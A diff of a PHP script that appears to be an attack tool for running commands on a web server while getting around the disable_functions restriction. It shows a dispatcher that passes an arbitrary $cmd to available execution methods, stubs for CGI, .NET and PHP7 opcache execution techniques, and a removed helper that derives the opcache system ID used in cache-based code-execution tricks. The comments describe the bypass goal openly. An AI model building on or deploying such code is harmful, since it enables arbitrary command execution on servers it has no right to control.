@@ -14,7 +14,7 @@ if (directly_function_exec($cmd))
 	exit(0);
 
 if (count($methods_map) !== 0)
-	($methods_map[0][1])($cmd);
+	$methods_map[0][1]($cmd);
 
 
 //these are the functions we can use to fuck the shit
@@ -329,68 +329,5 @@ function DOTNET_exec($cmd) {
 
 
 function mod_cgi_exec($cmd) {
-
-}
-
-
-
-
-
-
-
-//sad, this method seems couldnt bypass disable functions
-
-/*
- * limitation:
- * opcache.file_cache=xxxxxxx
- * and other things...
- */
-
-//will be used later
-function system_id_calc() {
-/*
-	ob_start();
-	phpinfo();
-	$info = ob_get_contents();
-	ob_end_clean();
-
-	//$matchs = array();
-
-	if (preg_match('~<tr><td class="e">PHP Version </td><td class="v">(.*) </td></tr>~', $info, $matchs))
-		$version = $matchs[1];
-	else
-		$version = PHP_VERSION;
-
-	if (preg_match('~<tr><td class="e">Zend Extension Build </td><td class="v">(.*) </td></tr>~', $info, $matchs))
-		$zend_build = $matchs[1];
-	else
-		return false;
-
-	if (preg_match('~<tr><td class="e">System </td><td class="v">(.*) </td></tr>~', $info, $matchs))
-		$arch = end(preg_split('/ /', $matchs[1]));
-	else
-		return false;
-
-	if ($arch === 'x86_64')
-		$bin_id_suffix = '148888';
-	else
-		$bin_id_suffix = '144444';
-
-	$zend_bin_id = 'BIN_'.$bin_id_suffix;
-
-	$system_id = md5($version . $zend_build . $zend_bin_id);
-*/
-	$file_cache_dir = get_cfg_var('opcache.file_cache');
-	$dirs = scandir($file_cache_dir);
-	if (count($dirs) !== 3)
-		return false;
-	else
-		$system_id = $dirs[2];
-
-	return $system_id;
-}
-
-
-function php7_opcache_exec($cmd) {
 
 }
